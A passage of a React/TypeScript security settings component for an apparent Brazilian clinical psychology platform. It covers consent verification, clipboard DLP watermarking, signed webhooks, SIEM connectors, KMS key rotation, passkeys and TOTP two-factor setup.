    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao resolver incidente formalmente.'
      });
    }
  };

  // Estados da Central de Governança de Consentimento do Paciente & Smart Revocation (LGPD Art. 7/8/9/11/18 & CFP 006/2019)
  const [consentOverview, setConsentOverview] = useState<ConsentLedgerOverview | null>(null);
  const [consentReceipts, setConsentReceipts] = useState<ConsentReceipt[]>([]);
  const [loadingConsentData, setLoadingConsentData] = useState<boolean>(false);
  const [verifyTokenInput, setVerifyTokenInput] = useState<string>('');
  const [verifyingToken, setVerifyingToken] = useState<boolean>(false);
  const [verifyTokenResult, setVerifyTokenResult] = useState<ConsentReceiptResponse | null>(null);

  const fetchConsentData = async () => {
    try {
      setLoadingConsentData(true);
      const res = await api.getConsentOverview();
      if (res.success) {
        setConsentOverview(res.overview);
        setConsentReceipts(res.recentReceipts || []);
      }
    } catch (err: any) {
      console.error('Erro ao carregar dados de governança de consentimento:', err);
    } finally {
      setLoadingConsentData(false);
    }
  };

  const handleVerifyConsentToken = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verifyTokenInput.trim()) return;
    try {
      setVerifyingToken(true);
      setVerifyTokenResult(null);
      const res = await api.verifyConsentToken(verifyTokenInput.trim());
      setVerifyTokenResult(res);
    } catch (err: any) {
      setVerifyTokenResult({
        success: false,
        valid: false,
        message: err.message || 'Falha ao verificar token de consentimento.'
      });
    } finally {
      setVerifyingToken(false);
    }
  };

  // Estados de Data Loss Prevention (DLP) no Clipboard & Marca d'Água Esteganográfica (LGPD Art. 46 & CFP nº 001/2009)
  const [dlpOverview, setDlpOverview] = useState<DlpAuditOverview | null>(null);
  const [loadingDlp, setLoadingDlp] = useState<boolean>(false);
  const [inspectInputText, setInspectInputText] = useState<string>('');
  const [inspectingDlp, setInspectingDlp] = useState<boolean>(false);
  const [inspectResult, setInspectResult] = useState<DlpInspectionResult | null>(null);
  const [updatingDlpPolicy, setUpdatingDlpPolicy] = useState<boolean>(false);

  const fetchDlpData = async () => {
    try {
      setLoadingDlp(true);
      const res = await api.getDlpOverview();
      if (res.success) {
        setDlpOverview(res.overview);
      }
    } catch (err: any) {
      console.error('Erro ao carregar dados de DLP:', err);
    } finally {
      setLoadingDlp(false);
    }
  };

  const handleInspectDlp = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!inspectInputText.trim()) return;
    try {
      setInspectingDlp(true);
      setInspectResult(null);
      const res = await api.inspectClipboardDlp({ suspiciousText: inspectInputText });
      if (res.success) {
        setInspectResult(res.result);
      }
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao periciar texto com marca d\'água esteganográfica.'
      });
    } finally {
      setInspectingDlp(false);
    }
  };

  const handleUpdateDlpPolicy = async (newPolicy: DlpPolicyMode) => {
    try {
      setUpdatingDlpPolicy(true);
      const res = await api.updateDlpPolicy(newPolicy);
      if (res.success) {
        setFeedback({
          type: 'success',
          message: `Política de DLP atualizada para ${newPolicy} com sucesso!`
        });
        await fetchDlpData();
      }
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao atualizar política global de DLP.'
      });
    } finally {
      setUpdatingDlpPolicy(false);
    }
  };

  const handleLoadDlpDemoSample = async () => {
    try {
      const res = await api.evaluateClipboardDlp({
        text: 'S: Paciente relata ideação persecutória leve e ansiedade ao falar em público. A: Manutenção do plano terapêutico cognitivo-comportamental (F41.1). P: Prescrição de treino assertivo.',
        patientId: 'patient-demo-1',
        sourceContext: 'SOAP_NOTES',
        policyMode: dlpOverview?.activePolicy || DlpPolicyMode.WATERMARK_ONLY
      });
      if (res.success) {
        setInspectInputText(res.result.transformedText);
        setFeedback({
          type: 'success',
          message: 'Amostra clínica com marca d\'água esteganográfica injetada no inspetor!'
        });
      }
    } catch (err: any) {
      setFeedback({
        type: 'error',
        message: err.message || 'Falha ao gerar amostra com marca d\'água.'
      });
    }
  };

  React.useEffect(() => {
    if (currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) {
      fetchWebrtcSessions();
      fetchWafOverview();
      fetchNetworkResilienceData();
      fetchMediaStorageData();
      fetchSessionRecoveryData();
      fetchZkpData();
      fetchThreatIntelligenceData();
      fetchConsentData();
      fetchDlpData();
    }
    if (currentUser.role === UserRole.ADMIN) {
      fetchInfraStatus();
      fetchHardeningOverview();
    }
  }, [currentUser.role]);

  const handleResetRateLimit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setLoadingInfra(true);
      const res = await api.resetRateLimit(resetKeyInput.trim() || undefined);
      setFeedback({ type: 'success', message: res.message });
      setResetKeyInput('');
      await fetchInfraStatus();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao resetar rate limit.' });
    } finally {
      setLoadingInfra(false);
    }
  };

  const handleRotateCacheKey = async () => {
    try {
      setLoadingInfra(true);
      const res = await api.rotateCacheKey();
      setFeedback({ type: 'success', message: res.message });
      await fetchInfraStatus();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao rotacionar DEK em RAM.' });
    } finally {
      setLoadingInfra(false);
    }
  };

  // Estados de Webhooks Assinados HMAC-SHA256 (Opção J)
  const [webhooks, setWebhooks] = useState<WebhookSubscription[]>([]);
  const [loadingWebhooks, setLoadingWebhooks] = useState<boolean>(false);
  const [testingWebhookId, setTestingWebhookId] = useState<string | null>(null);
  const [showCreateWebhookModal, setShowCreateWebhookModal] = useState<boolean>(false);
  const [newWebhookUrl, setNewWebhookUrl] = useState<string>('https://');
  const [newWebhookDescription, setNewWebhookDescription] = useState<string>('');
  const [newWebhookEvents, setNewWebhookEvents] = useState<WebhookEventType[]>([
    'SECURITY_ALERT', 
    'BACKUP_RESTORE'
  ]);
  const [copiedWebhookSecret, setCopiedWebhookSecret] = useState<string | null>(null);

  const fetchWebhooks = async () => {
    try {
      setLoadingWebhooks(true);
      const data = await api.getWebhooks();
      setWebhooks(data);
    } catch {
      // Ignora se não for admin
    } finally {
      setLoadingWebhooks(false);
    }
  };

  // Estados de Health & Readiness Probes (Opção L)
  const [readinessProbe, setReadinessProbe] = useState<ReadinessProbeResponse | null>(null);
  const [livenessProbe, setLivenessProbe] = useState<LivenessProbeResponse | null>(null);
  const [startupProbe, setStartupProbe] = useState<StartupProbeResponse | null>(null);
  const [loadingProbes, setLoadingProbes] = useState<boolean>(false);

  const fetchProbes = async () => {
    try {
      setLoadingProbes(true);
      const [readiness, liveness, startup] = await Promise.all([
        api.getReadinessProbe(),
        api.getLivenessProbe(),
        api.getStartupProbe()
      ]);
      setReadinessProbe(readiness);
      setLivenessProbe(liveness);
      setStartupProbe(startup);
    } catch (err: any) {
      console.warn('Falha ao coletar probes:', err.message);
    } finally {
      setLoadingProbes(false);
    }
  };

  // Estados de Monitoramento Sintético & Testes E2E (Opção M)
  const [syntheticResult, setSyntheticResult] = useState<SyntheticJourneyResult | null>(null);
  const [syntheticHistory, setSyntheticHistory] = useState<SyntheticJourneyResult[]>([]);
  const [resilienceResult, setResilienceResult] = useState<ResilienceCheckResult | null>(null);
  const [loadingSynthetic, setLoadingSynthetic] = useState<boolean>(false);
  const [selectedScenario, setSelectedScenario] = useState<'full_clinical_journey' | 'resilience_only'>('full_clinical_journey');

  const fetchSyntheticData = async () => {
    try {
      setLoadingSynthetic(true);
      const [historyData, resCheck] = await Promise.all([
        api.getSyntheticHistory(),
        api.getResilienceStatus()
      ]);
      setSyntheticHistory(historyData.executions);
      if (historyData.executions.length > 0) {
        setSyntheticResult(historyData.executions[0]);
      }
      setResilienceResult(resCheck);
    } catch (err: any) {
      console.warn('Falha ao coletar histórico sintético:', err.message);
    } finally {
      setLoadingSynthetic(false);
    }
  };

  const handleRunSyntheticProbe = async (scenario: 'full_clinical_journey' | 'resilience_only' = selectedScenario) => {
    try {
      setLoadingSynthetic(true);
      const res = await api.runSyntheticProbe({ scenario });
      setSyntheticResult(res);
      setFeedback({ 
        type: 'success', 
        message: `Sonda sintética concluída: ${res.summary.passed}/${res.summary.total} passos validados com sucesso (${res.totalDurationMs}ms).` 
      });
      await fetchSyntheticData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao executar sonda sintética.' });
    } finally {
      setLoadingSynthetic(false);
    }
  };

  // Estados de Autenticação Biométrica WebAuthn / Passkeys (Opção O)
  const [passkeys, setPasskeys] = useState<PasskeyInfoDTO[]>([]);
  const [loadingPasskeys, setLoadingPasskeys] = useState<boolean>(false);
  const [registeringPasskey, setRegisteringPasskey] = useState<boolean>(false);
  const [testingPasskey, setTestingPasskey] = useState<boolean>(false);
  const [showAddPasskeyModal, setShowAddPasskeyModal] = useState<boolean>(false);
  const [newPasskeyFriendlyName, setNewPasskeyFriendlyName] = useState<string>('');
  const [isWebAuthnSupported] = useState<boolean>(() => api.isWebAuthnSupported());

  const fetchPasskeys = async () => {
    try {
      setLoadingPasskeys(true);
      const res = await api.listPasskeys();
      setPasskeys(res);
    } catch (err: any) {
      console.warn('Falha ao listar passkeys:', err.message);
    } finally {
      setLoadingPasskeys(false);
    }
  };

  const handleRegisterPasskey = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setRegisteringPasskey(true);
      const name = newPasskeyFriendlyName.trim() || 'Dispositivo Biométrico';
      const res = await api.registerPasskeyWithBrowser(name);
      setFeedback({ 
        type: 'success', 
        message: `Passkey "${res.friendlyName}" registrada com sucesso via FIDO2 WebAuthn!` 
      });
      setShowAddPasskeyModal(false);
      setNewPasskeyFriendlyName('');
      await fetchPasskeys();
      const me = await api.getMe();
      onUserUpdated(me);
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao registrar Passkey biométrica.' });
    } finally {
      setRegisteringPasskey(false);
    }
  };

  const handleDeletePasskey = async (id: string, friendlyName: string) => {
    if (!confirm(`Deseja realmente revogar a Passkey biométrica "${friendlyName}"?`)) return;
    try {
      setLoadingPasskeys(true);
      const res = await api.deletePasskey(id);
      setFeedback({ type: 'success', message: res.message });
      await fetchPasskeys();
      const me = await api.getMe();
      onUserUpdated(me);
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao revogar Passkey.' });
    } finally {
      setLoadingPasskeys(false);
    }
  };

  const handleTestBiometricLogin = async () => {
    try {
      setTestingPasskey(true);
      const res = await api.authenticatePasskeyWithBrowser(currentUser.email);
      setFeedback({ 
        type: 'success', 
        message: `Asserção biométrica verificada com sucesso! Login validado via WebAuthn P-256 (${res.user?.name || currentUser.name}).` 
      });
      await fetchPasskeys();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha na verificação biométrica.' });
    } finally {
      setTestingPasskey(false);
    }
  };

  // Estados de Conectores SIEM Externos & Retry Resiliente com DLQ (RFC §4.4 & §5.2)
  const [siemConnectors, setSiemConnectors] = useState<SiemConnector[]>([]);
  const [loadingSiemConnectors, setLoadingSiemConnectors] = useState<boolean>(false);
  const [siemQueueStats, setSiemQueueStats] = useState<SiemQueueResponse | null>(null);
  const [siemDlqItems, setSiemDlqItems] = useState<SiemQueueItem[]>([]);
  const [testingSiemId, setTestingSiemId] = useState<string | null>(null);
  const [siemTestResultModal, setSiemTestResultModal] = useState<{ connectorName: string; result: any } | null>(null);
  const [showCreateSiemModal, setShowCreateSiemModal] = useState<boolean>(false);
  const [replayingDlqId, setReplayingDlqId] = useState<string | null>(null);
  const [replayingAllDlq, setReplayingAllDlq] = useState<boolean>(false);

  // Form de novo conector SIEM
  const [newSiemProvider, setNewSiemProvider] = useState<SiemProvider>('datadog');
  const [newSiemName, setNewSiemName] = useState<string>('Datadog SIEM Core (Logs v2)');
  const [newSiemUrl, setNewSiemUrl] = useState<string>('https://http-intake.logs.datadoghq.com/api/v2/logs');
  const [newSiemApiKey, setNewSiemApiKey] = useState<string>('');
  const [newSiemIndexOrSource, setNewSiemIndexOrSource] = useState<string>('clinical-platform');
  const [newSiemEvents, setNewSiemEvents] = useState<WebhookEventType[]>([
    'SECURITY_ALERT',
    'AUTH_LOGIN_FAILED',
    'BACKUP_RESTORE'
  ]);

  const handleProviderChange = (prov: SiemProvider) => {
    setNewSiemProvider(prov);
    switch (prov) {
      case 'datadog':
        setNewSiemName('Datadog SIEM Core (Logs v2)');
        setNewSiemUrl('https://http-intake.logs.datadoghq.com/api/v2/logs');
        setNewSiemIndexOrSource('clinical-platform');
        break;
      case 'splunk':
        setNewSiemName('Splunk HEC Cluster');
        setNewSiemUrl('https://splunk-hec.clinica.com.br:8088/services/collector/event');
        setNewSiemIndexOrSource('security_audit');
        break;
      case 'elastic':
        setNewSiemName('Elasticsearch Security Lake (ECS 8.11)');
        setNewSiemUrl('https://elastic-cluster.clinica.com.br:9200/terapiainfoco-audit/_doc');
        setNewSiemIndexOrSource('terapiainfoco-audit-logs');
        break;
      case 'generic':
        setNewSiemName('Coletor SIEM Customizado');
        setNewSiemUrl('https://siem.clinica.com.br/events');
        setNewSiemIndexOrSource('');
        break;
    }
  };

  const fetchSiemData = async () => {
    try {
      setLoadingSiemConnectors(true);
      const [connectors, queue, dlq] = await Promise.all([
        api.getSiemConnectors(),
        api.getSiemQueue(),
        api.getSiemDlq()
      ]);
      setSiemConnectors(connectors);
      setSiemQueueStats(queue);
      setSiemDlqItems(dlq);
    } catch (err: any) {
      console.warn('Falha ao coletar dados SIEM:', err.message);
    } finally {
      setLoadingSiemConnectors(false);
    }
  };

  const handleCreateSiemConnector = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newSiemName || !newSiemUrl || newSiemEvents.length === 0) {
      setFeedback({ type: 'error', message: 'Preencha nome, URL e selecione ao menos um evento.' });
      return;
    }

    try {
      setLoadingSiemConnectors(true);
      const created = await api.createSiemConnector({
        provider: newSiemProvider,
        name: newSiemName.trim(),
        endpointUrl: newSiemUrl.trim(),
        apiKey: newSiemApiKey.trim() || undefined,
        indexOrSource: newSiemIndexOrSource.trim() || undefined,
        subscribedEvents: newSiemEvents
      });
      setFeedback({ type: 'success', message: `Conector SIEM "${created.name}" criado com sucesso!` });
      setShowCreateSiemModal(false);
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao criar conector SIEM.' });
    } finally {
      setLoadingSiemConnectors(false);
    }
  };

  const handleDeleteSiemConnector = async (id: string, name: string) => {
    if (!confirm(`Deseja realmente remover o conector SIEM "${name}"?`)) return;
    try {
      setLoadingSiemConnectors(true);
      await api.deleteSiemConnector(id);
      setFeedback({ type: 'success', message: `Conector "${name}" removido com sucesso!` });
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao remover conector.' });
    } finally {
      setLoadingSiemConnectors(false);
    }
  };

  const handleTestSiemConnector = async (id: string, name: string) => {
    try {
      setTestingSiemId(id);
      const result = await api.testSiemConnector(id);
      setSiemTestResultModal({ connectorName: name, result });
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao testar conector SIEM.' });
    } finally {
      setTestingSiemId(null);
    }
  };

  const handleReplayDlqItem = async (id: string) => {
    try {
      setReplayingDlqId(id);
      await api.replaySiemDlqItem(id);
      setFeedback({ type: 'success', message: 'Evento reprocessado com sucesso a partir da Dead-Letter Queue!' });
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao reprocessar item da DLQ.' });
    } finally {
      setReplayingDlqId(null);
    }
  };

  const handleReplayAllDlq = async () => {
    try {
      setReplayingAllDlq(true);
      const res = await api.replayAllSiemDlq();
      setFeedback({ 
        type: 'success', 
        message: `Reprocessamento concluído: ${res.successCount} eventos entregues com sucesso, ${res.failedCount} falharam.` 
      });
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao reprocessar eventos da DLQ.' });
    } finally {
      setReplayingAllDlq(false);
    }
  };

  const handleDeleteDlqItem = async (id: string) => {
    try {
      await api.deleteSiemDlqItem(id);
      setFeedback({ type: 'success', message: 'Item descartado da Dead-Letter Queue.' });
      await fetchSiemData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao descartar item da DLQ.' });
    }
  };

  // Estados de Gestão de Chaves KMS & Rotação Contínua (NIST SP 800-57 & RFC §4.2)
  const [kmsStatus, setKmsStatus] = useState<KmsSystemStatus | null>(null);
  const [loadingKms, setLoadingKms] = useState<boolean>(false);
  const [rotatingKms, setRotatingKms] = useState<boolean>(false);
  const [reWrappingKms, setReWrappingKms] = useState<boolean>(false);
  const [showRotateKmsModal, setShowRotateKmsModal] = useState<boolean>(false);
  const [showKmsPolicyModal, setShowKmsPolicyModal] = useState<boolean>(false);
  const [revokeKeyModalTarget, setRevokeKeyModalTarget] = useState<KmsKeyMetadata | null>(null);
  const [rotateReason, setRotateReason] = useState<string>('Rotação periódica programada (NIST SP 800-57)');
  const [rotateReWrapOption, setRotateReWrapOption] = useState<boolean>(true);
  const [policyIntervalDays, setPolicyIntervalDays] = useState<number>(90);
  const [policyAutoReWrap, setPolicyAutoReWrap] = useState<boolean>(true);
  const [policyAlertDays, setPolicyAlertDays] = useState<number>(15);
  const [revokeReason, setRevokeReason] = useState<string>('Descontinuação por ciclo de vida de segurança');

  const fetchKmsData = async () => {
    try {
      setLoadingKms(true);
      const data = await api.getKmsStatus();
      setKmsStatus(data);
      if (data.policy) {
        setPolicyIntervalDays(data.policy.intervalDays);
        setPolicyAutoReWrap(data.policy.autoReWrapLegacyDeks);
        setPolicyAlertDays(data.policy.alertThresholdDays);
      }
    } catch {
      // Ignora se não for admin
    } finally {
      setLoadingKms(false);
    }
  };

  const handleRotateKmsKey = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setRotatingKms(true);
      const res = await api.rotateKmsKey({
        reason: rotateReason.trim() || 'Rotação periódica programada (NIST SP 800-57)',
        reWrapExisting: rotateReWrapOption
      });
      setFeedback({ type: 'success', message: res.message });
      setShowRotateKmsModal(false);
      await fetchKmsData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao rotacionar KEK mestre.' });
    } finally {
      setRotatingKms(false);
    }
  };

  const handleReWrapKmsDeks = async () => {
    try {
      setReWrappingKms(true);
      const res = await api.reWrapKmsDeks();
      setFeedback({ type: 'success', message: res.message });
      await fetchKmsData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao re-envelopar DEKs.' });
    } finally {
      setReWrappingKms(false);
    }
  };

  const handleUpdateKmsPolicy = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setLoadingKms(true);
      const res = await api.updateKmsPolicy({
        enabled: true,
        intervalDays: Number(policyIntervalDays),
        autoReWrapLegacyDeks: policyAutoReWrap,
        alertThresholdDays: Number(policyAlertDays)
      });
      setFeedback({ type: 'success', message: res.message });
      setShowKmsPolicyModal(false);
      await fetchKmsData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao atualizar política KMS.' });
    } finally {
      setLoadingKms(false);
    }
  };

  const handleRevokeKmsKey = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!revokeKeyModalTarget) return;
    try {
      setLoadingKms(true);
      const res = await api.revokeKmsKey(revokeKeyModalTarget.version, {
        reason: revokeReason.trim() || 'Revogação manual por política de segurança'
      });
      setFeedback({ type: 'success', message: res.message });
      setRevokeKeyModalTarget(null);
      await fetchKmsData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao revogar chave KMS.' });
    } finally {
      setLoadingKms(false);
    }
  };

  // Estados de Testes de Carga, Stress Concorrente & SLOs RED (RFC §5.1, §5.2)
  const [stressReports, setStressReports] = useState<StressTestReport[]>([]);
  const [latestStressReport, setLatestStressReport] = useState<StressTestReport | null>(null);
  const [loadingStress, setLoadingStress] = useState<boolean>(false);
  const [runningStress, setRunningStress] = useState<boolean>(false);
  const [stressScenario, setStressScenario] = useState<StressScenario>(StressScenario.FULL_SYSTEM_MIXED);
  const [stressRequests, setStressRequests] = useState<number>(100);
  const [stressConcurrency, setStressConcurrency] = useState<number>(10);

  const fetchStressData = async () => {
    try {
      setLoadingStress(true);
      const reports = await api.getStressHistory();
      setStressReports(reports);
      if (reports.length > 0) {
        setLatestStressReport(reports[0]);
      }
    } catch {
      // Ignora se não for admin
    } finally {
      setLoadingStress(false);
    }
  };

  const handleRunStressTest = async () => {
    try {
      setRunningStress(true);
      const report = await api.runStressTest({
        scenario: stressScenario,
        totalRequests: Number(stressRequests),
        concurrency: Number(stressConcurrency)
      });
      setLatestStressReport(report);
      setFeedback({
        type: 'success',
        message: `Teste de Carga finalizado: ${report.rps} RPS com P99 de ${report.percentiles.p99}ms! (${report.slosPassedCount}/${report.slosTotalCount} SLOs cumpridos).`
      });
      await fetchStressData();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao executar teste de carga.' });
    } finally {
      setRunningStress(false);
    }
  };

  React.useEffect(() => {
    fetchPasskeys();
    if (currentUser.role === UserRole.ADMIN) {
      fetchInfraStatus();
      fetchWebhooks();
      fetchProbes();
      fetchSyntheticData();
      fetchSiemData();
      fetchKmsData();
      fetchStressData();
    }
  }, [currentUser.role]);

  const handleCreateWebhook = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newWebhookUrl || newWebhookEvents.length === 0) {
      setFeedback({ type: 'error', message: 'Preencha a URL e selecione ao menos um evento.' });
      return;
    }

    try {
      setLoadingWebhooks(true);
      const dto: CreateWebhookDTO = {
        url: newWebhookUrl.trim(),
        description: newWebhookDescription.trim() || 'Webhook SIEM / Segurança',
        events: newWebhookEvents
      };

      const created = await api.createWebhook(dto);
      setFeedback({ type: 'success', message: `Webhook para '${created.url}' criado com sucesso!` });
      setShowCreateWebhookModal(false);
      setNewWebhookUrl('https://');
      setNewWebhookDescription('');
      await fetchWebhooks();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Erro ao registrar webhook.' });
    } finally {
      setLoadingWebhooks(false);
    }
  };

  const handleTestWebhook = async (id: string) => {
    try {
      setTestingWebhookId(id);
      const res = await api.testWebhook(id);
      if (res.success) {
        setFeedback({ 
          type: 'success', 
          message: `Disparo de teste entregue com sucesso! Status HTTP ${res.deliveryLog.httpStatus} (${res.deliveryLog.latencyMs}ms).` 
        });
      } else {
        setFeedback({ 
          type: 'error', 
          message: `Falha no teste: ${res.message}` 
        });
      }
      await fetchWebhooks();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao testar webhook.' });
    } finally {
      setTestingWebhookId(null);
    }
  };

  const handleDeleteWebhook = async (id: string) => {
    if (!confirm('Deseja realmente remover esta inscrição de webhook?')) return;
    try {
      setLoadingWebhooks(true);
      await api.deleteWebhook(id);
      setFeedback({ type: 'success', message: 'Webhook removido com sucesso.' });
      await fetchWebhooks();
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Erro ao remover webhook.' });
    } finally {
      setLoadingWebhooks(false);
    }
  };

  const toggleEventSelection = (ev: WebhookEventType) => {
    if (newWebhookEvents.includes(ev)) {
      setNewWebhookEvents(newWebhookEvents.filter(e => e !== ev));
    } else {
      setNewWebhookEvents([...newWebhookEvents, ev]);
    }
  };

  const copySecret = (secret: string) => {
    navigator.clipboard.writeText(secret);
    setCopiedWebhookSecret(secret);
    setTimeout(() => setCopiedWebhookSecret(null), 2500);
  };

  const start2FASetup = async () => {
    try {
      setLoading(true);
      setFeedback(null);
      const res = await api.setup2FA();
      setTotpSecret(res.secret);
      setBackupCodes(res.backupCodes);

      const qr = await QRCode.toDataURL(res.otpauthUri, {
        width: 220,
        margin: 2,
        color: {
          dark: '#0f172a',
          light: '#ffffff'
        }
      });
      setQrCodeDataUrl(qr);
      setSetupStep('scanning');
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Erro ao iniciar configuração do 2FA.' });
    } finally {
      setLoading(false);
    }
  };

  const handleVerify2FA = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verifyCode || verifyCode.trim().length !== 6) {
      setFeedback({ type: 'error', message: 'Digite o código de 6 dígitos gerado no app autenticador.' });
      return;
    }

    try {
      setLoading(true);
      setFeedback(null);
      const res = await api.verify2FA(verifyCode.trim());
      setSetupStep('confirmed');
      onUserUpdated({ ...currentUser, twoFactorEnabled: true });
      setFeedback({ type: 'success', message: res.message });
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Código TOTP inválido. Verifique o horário do celular.' });
    } finally {
      setLoading(false);
    }
  };

  const handleDisable2FA = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setLoading(true);
      setFeedback(null);
      const res = await api.disable2FA(disablePassword);
      setShowDisableModal(false);
      setDisablePassword('');
      setSetupStep('idle');
      onUserUpdated({ ...currentUser, twoFactorEnabled: false });
      setFeedback({ type: 'success', message: res.message });
    } catch (err: any) {
      setFeedback({ type: 'error', message: err.message || 'Falha ao desativar 2FA.' });
    } finally {
      setLoading(false);
    }
  };

  const copySecretToClipboard = () => {
    navigator.clipboard.writeText(totpSecret);
    setCopiedSecret(true);
    setTimeout(() => setCopiedSecret(false), 2500);
  };

  return (
    <div className="space-y-8 animate-fade-in">
      {/* Cabeçalho */}
      <div>
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-teal-50 dark:bg-teal-900/30 border border-teal-200 dark:border-teal-700/50 text-teal-800 dark:text-teal-300 text-xs font-semibold mb-2">
          <KeyRound className="w-3.5 h-3.5 text-teal-600 dark:text-teal-400" />
          Módulo de Segurança, 2FA/MFA & RBAC • RFC-001 Opção C
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-slate-900 dark:text-white">
          Gestão de Acesso Seguro & Conformidade LGPD
        </h1>
        <p className="text-sm text-slate-600 dark:text-slate-400 mt-1">
          Controle de autenticação em duas etapas (TOTP RFC 6238), papéis de acesso clínico e integridade de sessões.
        </p>
      </div>

      {feedback && (
        <div
          className={`p-4 rounded-2xl flex items-center gap-3 text-sm ${
            feedback.type === 'success'
              ? 'bg-emerald-50 text-emerald-800 border border-emerald-200 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
              : 'bg-rose-50 text-rose-800 border border-rose-200 dark:bg-rose-950/40 dark:text-rose-300 dark:border-rose-800'
          }`}
        >
          {feedback.type === 'success' ? (
            <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-600 dark:text-emerald-400" />
          ) : (
            <AlertCircle className="w-5 h-5 shrink-0 text-rose-600 dark:text-rose-400" />
          )}
          <span className="flex-1 font-medium">{feedback.message}</span>
        </div>
      )}

      {/* Card 1: Status da Conta e 2FA */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-teal-500 to-emerald-400 flex items-center justify-center text-slate-950 font-bold text-lg shadow-md shadow-teal-500/20">
              <Fingerprint className="w-6 h-6 text-slate-950" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white">{currentUser.name}</h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">{currentUser.email}</p>
              {currentUser.crp && (
                <p className="text-[11px] font-medium text-teal-600 dark:text-teal-400 mt-0.5">
                  CRP {currentUser.crp} ({currentUser.crpRegion || 'SP'})
                </p>
              )}
            </div>
          </div>

          <div className="flex items-center gap-3">
            {currentUser.twoFactorEnabled ? (
              <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-100 dark:bg-emerald-950/60 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700">
                <Lock className="w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400" />
                2FA Ativo 🔒
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-100 dark:bg-amber-950/60 text-amber-800 dark:text-amber-300 border border-amber-300 dark:border-amber-700">
                <ShieldAlert className="w-3.5 h-3.5 text-amber-600 dark:text-amber-400" />
                2FA Desativado
              </span>
            )}

            {((currentUser.passkeysCount ?? 0) > 0 || passkeys.length > 0) ? (
              <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-violet-100 dark:bg-violet-950/60 text-violet-800 dark:text-violet-300 border border-violet-300 dark:border-violet-700">
                <Fingerprint className="w-3.5 h-3.5 text-violet-600 dark:text-violet-400" />
                {passkeys.length || currentUser.passkeysCount} Passkey(s) FIDO2
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-semibold bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 border border-slate-200 dark:border-slate-700">
                <Fingerprint className="w-3.5 h-3.5 text-slate-400" />
                0 Passkeys
              </span>
            )}
          </div>
        </div>

        {/* Bloco de Configuração de 2FA */}
        <div>
          <h3 className="text-base font-bold text-slate-900 dark:text-white mb-2 flex items-center gap-2">
            <Smartphone className="w-5 h-5 text-teal-600 dark:text-teal-400" />
            Autenticação de Dois Fatores (TOTP RFC 6238)
          </h3>
          <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed mb-6">
            Adiciona uma camada extra de proteção ao exigir um código de 6 dígitos gerado pelo Google Authenticator,
            Authy ou 1Password em conjunto com sua senha mestre, em conformidade com prontuários eletrônicos de saúde.
          </p>

          {!currentUser.twoFactorEnabled && setupStep === 'idle' && (
            <button
              onClick={start2FASetup}
              disabled={loading}
